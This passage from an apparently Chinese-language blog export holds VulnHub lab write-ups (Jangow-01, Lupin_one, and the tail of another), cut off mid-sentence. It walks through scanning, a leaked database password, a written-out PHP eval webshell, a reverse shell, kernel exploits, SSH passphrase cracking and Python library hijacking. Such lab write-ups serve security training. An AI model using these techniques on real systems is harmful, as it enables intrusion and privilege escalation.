class="line">QPvyUcye28zwkO6tgVMZx4osrIoN9WtDUUdbdmD2UBZ2n3CZMkOV9XJxeju51kH1fs8q39</span><br><span class="line">QXfxdNhBb3Yr2RjCFULDxhwDSIHzG7gfJEDaWYcOkNkIaHHgaV7kxzypYcqLrs0S7C4QAA</span><br><span class="line">AMEAhdmD7Qu5trtBF3mgfcdqpZOq6+tW6hkmR0hZNX5Z6fnedUx//QY5swKAEvgNCKK8Sm</span><br><span class="line">iFXlYfgH6K/5UnZngEbjMQMTdOOlkbrgpMYih+ZgyvK1LoOTyMvVgT5LMgjJGsaQ5393M2</span><br><span class="line">yUEiSXer7q90N6VHYXDJhUWX2V3QMcCqptSCS1bSqvkmNvhQXMAaAS8AJw19qXWXim15Sp</span><br><span class="line">WoqdjoSWEJxKeFTwUW7WOiYC2Fv5ds3cYOR8RorbmGnzdiZgxZAAAAwQDhNXKmS0oVMdDy</span><br><span class="line">3fKZgTuwr8My5Hyl5jra6owj/5rJMUX6sjZEigZa96EjcevZJyGTF2uV77AQ2Rqwnbb2Gl</span><br><span class="line">jdLkc0Yt9ubqSikd5f8AkZlZBsCIrvuDQZCoxZBGuD2DUWzOgKMlfxvFBNQF+LWFgtbrSP</span><br><span class="line">OgB4ihdPC1+6FdSjQJ77f1bNGHmn0amoiuJjlUOOPL1cIPzt0hzERLj2qv9DUelTOUranO</span><br><span class="line">cUWrPgrzVGT+QvkkjGJFX+r8tGWCAOQRUAAADBAM0cRhDowOFx50HkE+HMIJ2jQIefvwpm</span><br><span class="line">Bn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeI</span><br><span class="line">Rcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiR</span><br><span class="line">kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT</span><br><span class="line">8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p>这好像是一个密钥，可能可以用来ssh登录</p>
<p>之后通过路径扫描，又找到了后台登录页面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516161514.png" /></p>
<p>接下来利用wpscan进行扫描，得到wordpress的版本为 5.4.2
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.0.2.49/</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516161802.png" /></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.0.2.49/ --enumerate u</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516161916.png" /></p>
<p>就一个用户 admin</p>
<p>尝试暴力破解admin，结果失败了</p>
<h1 id="get-shell">3. get shell</h1>
<p>从信息收集中得到了靶机上可能存在一个用户
oscp，并且一个密钥，尝试使用密钥ssh登录。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh oscp@10.0.2.49 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p>登录成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516164307.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<h2 id="方法1">4.1. 方法1</h2>
<p>通过信息收集知道，目标靶机的操作系统为Ubuntu
20.04，因此直接使用CVE-2021-3493，一步到位</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516170208.png" /></p>
<p>但是，该靶机的发布时间是2020年，该CVE还没有被披露。所以，肯定存在另一种办法提权。</p>
<h2 id="方法2">4.2. 方法2</h2>
<p>利用下面的命令查找具有suid权限的文件： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516175207.png" /></p>
<p>suid bash提权命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516175453.png" /></p>
<p>最后读取器flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line">d73b04b0e696b0945283defa3eee4538</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>靶机难度简单，涉及以下的攻击方法：</p>
<ol type="1">
<li>ssh密钥登录</li>
<li>内核漏洞</li>
<li>suid提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>suid提权</tag>
        <tag>内核漏洞</tag>
        <tag>ssh密钥登录</tag>
      </tags>
  </entry>
  <entry>
    <title>Jangow-01 Writeup</title>
    <url>/2022/05/15/Jangow-01%20Writeup/</url>
    <content><![CDATA[<p>该靶机整体难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow:
1.0.1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中等</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.46</span><br><span class="line">3. sudo nmap -p21,80 -A 10.0.2.46</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>直接访问网页，发现一个目录
site，点击进入真正的页面，但是该页面没有功能点很少，当点击 Buscar
时，url 出现了变化，并且页面变白了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png" /></p>
<p>但是还不知道这里的用途是什么。</p>
<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$database = &quot;jangow01&quot;;</span><br><span class="line">$username = &quot;jangow01&quot;;</span><br><span class="line">$password = &quot;abygurl69&quot;;</span><br><span class="line">// Create connection</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p>
<h2 id="其他信息">2.3. 其他信息</h2>
<p>目前只有ftp需要登录信息，因此登录进去，在/var/www/html/site中找到了
burque.php 文件，内容如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png" /></p>
<p>说明可以RCE。</p>
<h1 id="反弹shell">3. 反弹shell</h1>
<h2 id="方法1">3.1. 方法1</h2>
<p>直接利用 RCE
反弹shell，这里需要注意的是端口被限制了，只允许反弹至kali的443端口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120618.png" /></p>
<blockquote>
<p>如果端口被做了限制，那就使用54/UDP, 80/TCP,
443/TCP。第一个是DNS默认的端口，80为http默认端口，443为https默认端口，一般都处于开放状态，且允许发送、接收数据。</p>
</blockquote>
<h2 id="方法2">3.2. 方法2</h2>
<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; reve.php</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; rev.php</span><br></pre></td></tr></table></figure></p>
<p>后者可以，前者不可以</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png" /></p>
<p>然后利用蚁剑连接上去</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120919.png" /></p>
<p>虽然最后还是利用443端口反弹shell（😀）</p>
<h1 id="权限提升">4. 权限提升</h1>
<p>我因为是先上线了蚁剑，所以我利用蚁剑来发送脚本。</p>
<p>先发送了一个
linux-exploit-suggester.sh，然后运行，得到许多可能存在的漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png" /></p>
<p>然后依次执行。现在kali上搜索</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png" /></p>
<p>然后利用蚁剑将文件传输到靶机，编译、执行 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. gcc 45010.c -o exp1</span><br><span class="line">2. chmod +x exp1</span><br><span class="line">3. ./exp1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png" /></p>
<p>最后的收尾工作，读取两个flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/jangow01/user.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">// 2. /root/proof.txt</span><br><span class="line">                @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                                                        </span><br><span class="line">                @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                                                                                        </span><br><span class="line">                @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                                                                                  </span><br><span class="line">                @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                                                                                  </span><br><span class="line">                @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                                                                                  </span><br><span class="line">                @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                                                                                 </span><br><span class="line">                @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                                                                                 </span><br><span class="line">                @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                                                                                </span><br><span class="line">                @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                 @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   </span><br><span class="line">                @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                              &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机整体难度不高，唯一的难点在于对端口做了限制。涉及到一下攻击方法：</p>
<ol type="1">
<li>备份文件泄露</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>内核漏洞</tag>
        <tag>备份文件泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Lupin_one Writeup</title>
    <url>/2022/05/28/Lupin_one%20Writeup/</url>
    <content><![CDATA[<p>该靶机不算很难，难就难在路径扫描，以及python代码的执行顺序</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/empire-lupinone,750/">Empire:
LupinOne ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528214524.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>主页面如下，就是一张图片给</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528214739.png" /></p>
<p>查看页面源码，得到一个注释信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Its an easy box, dont give up.</span><br></pre></td></tr></table></figure></p>
<p>访问 robots.txt 文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528214901.png" /></p>
<p>直接访问 /~myfiles 显示 Error 404</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528214938.png" /></p>
<p>但是很明显，这和真正的404是不一样的，比如访问随便一个文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528215008.png" /></p>
<p>查看 /~myfiles 的源码，得到一个注释信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your can do it, keep trying.</span><br></pre></td></tr></table></figure></p>
<p>普通的路径扫描也没有得到其他有用的信息。这时候关注这个 /~myfiles
是不是藏着其他文件，开头是 ~
所以一般的路径扫描没扫到呢？使用下面命令查实fuzz以下 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.25/~FUZZ</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528220726.png" /></p>
<p>扫到一个新的文件，/~secret，直接访问，得到如下一段话：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,</span><br><span class="line">Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.</span><br><span class="line">I&#x27;m smart I know that.</span><br><span class="line">Any problem let me know</span><br><span class="line">Your best friend icex64</span><br></pre></td></tr></table></figure></p>
<p>大致意思：“这是作者的秘密文件夹，他创造这个文件夹用来分享<strong>ssh密钥文件</strong>，该文件被藏在了某个地方，这样子黑客们就找不到它所以也无法破解它。作者说他很聪明，如果我有什么问题请给他说，他是我最后的朋友
icex64”</p>
<p>给了我们一个用户名
icex64，接下来的任务应该就是找到该目录下隐藏的某个文件，这个文件就是ssh的登录密钥。经过尝试多次之后，使用下面的命令可以成功扫到：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.100.25/~secret/.FUZZ -fc 403 -e .txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528222310.png" /></p>
<p>直接访问该文件 /~secret/.mysecret.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDfJvZbL8o6BfPjEPi125edV9JbCyNRFKKpTxpq7QSruk7L5LEXG8H4rsLyv6djUT9nJGWQKRPi3Bugawd7ixMUYoRMhagBmGYNafi4JBapacTMwG95wPyZT8Mz6gALq5Vmr8tkk9ry4Ph4U2ErihvNiFQVS7U9XBwQHc6fhrDHz2objdeDGvuVHzPgqMeRMZtjzaLBZ2wDLeJUKEjaJAHnFLxs1xWXU7V4gigRAtiMFB5bjFTc7owzKHcqP8nJrXou8VJqFQDMD3PJcLjdErZGUS7oauaa3xhyx8Ar3AyggnywjjwZ8uoWQbmx8Sx71x4NyhHZUzHpi8vkEkbKKk1rVLNBWHHi75HixzAtNTX6pnEJC3t7EPkbouDC2eQd9i6K3CnpZHY3mL7zcg2PHesRSj6e7oZBoM2pSVTwtXRFBPTyFmUavtitoA8kFZb4DhYMcxNyLf7r8H98WbtCshaEBaY7b5CntvgFFEucFanfbz6w8cDyXJnkzeW1fz19Ni9i6h4Bgo6BR8Fkd5dheH5TGz47VFH6hmY3aUgUvP8Ai2F2jKFKg4i3HfCJHGg1CXktuqznVucjWmdZmuACA2gce2rpiBT6GxmMrfSxDCiY32axw2QP7nzEBvCJi58rVe8JtdESt2zHGsUga2iySmusfpWqjYm8kfmqTbY4qAK13vNMR95QhXV9VYp9qffG5YWY163WJV5urYKM6BBiuK9QkswCzgPtjsfFBBUo6vftNqCNbzQn4NMQmxm28hDMDU8GydwUm19ojNo1scUMzGfN4rLx7bs3S9wYaVLDLiNeZdLLU1DaKQhZ5cFZ7iymJHXuZFFgpbYZYFigLa7SokXis1LYfbHeXMvcfeuApmAaGQk6xmajEbpcbn1H5QQiQpYMX3BRp41w9RVRuLGZ1yLKxP37ogcppStCvDMGfiuVMU5SRJMajLXJBznzRSqBYwWmf4MS6B57xp56jVk6maGCsgjbuAhLyCwfGn1LwLoJDQ1kjLmnVrk7FkUUESqJKjp5cuX1EUpFjsfU1HaibABz3fcYY2cZ78qx2iaqS7ePo5Bkwv5XmtcLELXbQZKcHcwxkbC5PnEP6EUZRb3nqm5hMDUUt912ha5kMR6g4aVG8bXFU6an5PikaedHBRVRCygkpQjm8Lhe1cA8X2jtQiUjwveF5bUNPmvPGk1hjuP56aWEgnyXzZkKVPbWj7MQQ3kAfqZ8hkKD1VgQ8pmqayiajhFHorfgtRk8ZpuEPpHH25aoJfNMtY45mJYjHMVSVnvG9e3PHrGwrks1eLQRXjjRmGtWu9cwT2bjy2huWY5b7xUSAXZfmRsbkT3eFQnGkAHmjMZ5nAfmeGhshCtNjAU4idu8o7HMmMuc3tpK6res9HTCo35ujK3UK2LyMFEKjBNcXbigDWSM34mXSKHA1M4MF7dPewvQsAkvxRTCmeWwRWz6DKZv2MY1ezWd7mLvwGo9ti9SMTXrkrxHQ8DShuNorjCzNCuxLNG9ThpPgWJoFb1sJL1ic9QVTvDHCJnD1AKdCjtNHrG973BVZNUF6DwbFq5d4CTLN6jxtCFs3XmoKquzEY7MiCzRaq3kBNAFYNCoVxRBU3d3aXfLX4rZXEDBfAgtumkRRmWowkNjs2JDZmzS4H8nawmMa1PYmrr7aNDPEW2wdbjZurKAZhheoEYCvP9dfqdbL9gPrWfNBJyVBXRD8EZwFZNKb1eWPh1sYzUbPPhgruxWANCH52gQpfATNqmtTJZFjsfpiXLQjdBxdzfz7pWvK8jivhnQaiajW3pwt4cZxwMfcrrJke14vN8Xbyqdr9zLFjZDJ7nLdmuXTwxPwD8Seoq2hYEhR97DnKfMY2LhoWGaHoFqycPCaX5FCPNf9CFt4n4nYGLau7ci5uC7ZmssiT1jHTjKy7J9a4q614GFDdZULTkw8Pmh92fuTdK7Z6fweY4hZyGdUXGtPXveXwGWES36ecCpYXPSPw6ptVb9RxC81AZFPGnts85PYS6aD2eUmge6KGzFopMjYLma85X55Pu4tCxyF2FR9E3c2zxtryG6N2oVTnyZt23YrEhEe9kcCX59RdhrDr71Z3zgQkAs8uPMM1JPvMNgdyNzpgEGGgj9czgBaN5PWrpPBWftg9fte4xYyvJ1BFN5WDvTYfhUtcn1oRTDow67w5zz3adjLDnXLQc6MaowZJ2zyh4PAc1vpstCRtKQt35JEdwfwUe4wzNr3sidChW8VuMU1Lz1cAjvcVHEp1Sabo8FprJwJgRs5ZPA7Ve6LDW7hFangK8YwZmRCmXxArBFVwjfV2SjyhTjhdqswJE5nP6pVnshbV8ZqG2L8d1cwhxpxggmu1jByELxVHF1C9T3GgLDvgUv8nc7PEJYoXpCoyCs55r35h9YzfKgjcJkvFTdfPHwW8fSjCVBuUTKSEAvkRr6iLj6H4LEjBg256G4DHHqpwTgYFtejc8nLX77LUoVmACLvfC439jtVdxCtYA6y2vj7ZDeX7zp2VYR89GmSqEWj3doqdahv1DktvtQcRBiizMgNWYsjMWRM4BPScnn92ncLD1Bw5ioB8NyZ9CNkMNk4Pf7Uqa7vCTgw4VJvvSjE6PRFnqDSrg4avGUqeMUmngc5mN6WEa3pxHpkhG8ZngCqKvVhegBAVi7nDBTwukqEDeCS46UczhXMFbAgnQWhExas547vCXho71gcmVqu2x5EAPFgJqyvMmRScQxiKrYoK3p279KLAySM4vNcRxrRrR2DYQwhe8YjNsf8MzqjX54mhbWcjz3jeXokonVk77P9g9y69DVzJeYUvfXVCjPWi7aDDA7HdQd2UpCghEGtWSfEJtDgPxurPq8qJQh3N75YF8KeQzJs77Tpwcdv2Wuvi1L5ZZtppbWymsgZckWnkg5NB9Pp5izVXCiFhobqF2vd2jhg4rcpLZnGdmmEotL7CfRdVwUWpVppHRZzq7FEQQFxkRL7JzGoL8R8wQG1UyBNKPBbVnc7jGyJqFujvCLt6yMUEYXKQTipmEhx4rXJZK3aKdbucKhGqMYMHnVbtpLrQUaPZHsiNGUcEd64KW5kZ7svohTC5i4L4TuEzRZEyWy6v2GGiEp4Mf2oEHMUwqtoNXbsGp8sbJbZATFLXVbP3PgBw8rgAakz7QBFAGryQ3tnxytWNuHWkPohMMKUiDFeRyLi8HGUdocwZFzdkbffvo8HaewPYFNsPDCn1PwgS8wA9agCX5kZbKWBmU2zpCstqFAxXeQd8LiwZzPdsbF2YZEKzNYtckW5RrFa5zDgKm2gSRN8gHz3WqS</span><br></pre></td></tr></table></figure></p>
<p>最开始以为是base64编码的，结果解码出一堆乱字符串。还是放到 cyberchef
上解码，结果是 base58</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528222748.png" /></p>
<h1 id="get-shell">3. get shell</h1>
<p>将解码得到的数据保存。然后使用该密钥登录 ssh <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh icex64@192.168.100.25 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p>很尴尬，并没有成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528223149.png" /></p>
<p>这时候又想到了刚刚作者的提示：so that hackers dont find it and crack
my passphrase with fasttrack。不仅要找到，还要爆破出 passphrase。</p>
<p>首先，利用 ssh2john 将密钥转为 john 能够识别的文件：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh2john id_rsa &gt; rsacrack</span><br></pre></td></tr></table></figure></p>
<p>然后再用 john 去暴力破解： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john rsacrack --wordlist=/usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure></p>
<p>（作者还提示了使用的字典，太贴心了）</p>
<p>不小心窗口被我关了，不过可以使用 <code>john --show rsacrack</code>
查看破解的信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528224803.png" /></p>
<p>得到passphrase为 <code>P@55w0rd!</code></p>
<p>再次登录 ssh</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528224901.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>首先查看 /etc/passwd 有几个用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528225000.png" /></p>
<p>共三个用户。</p>
<p>在 /home/arsene 目录下发现了两个可读的可疑文件 heist.py 和
note.txt，内容分别为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528225219.png" /></p>
<p>查看 sudo -l 发现我们可以以 arsene 的身份执行 heist.py 文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528225416.png" /></p>
<p>使用下面命令查找 webbrowser <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -iname &quot;*webbrowser*&quot; -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528225640.png" /></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /usr/lib/python3.9/webbrowser.py</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528225719.png" /></p>
<p>我们居然对该文件具有所有权限，因此思路就很明确了，在该文件内添加一句话</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528230402.png" /></p>
<blockquote>
<p>疑问：python 文件会逐行执行吗？</p>
</blockquote>
<p>保存并退出，然后执行： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528230515.png" /></p>
<p>查看 sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528231000.png" /></p>
<p>在 <a href="https://gtfobins.github.io/gtfobins/pip/">pip |
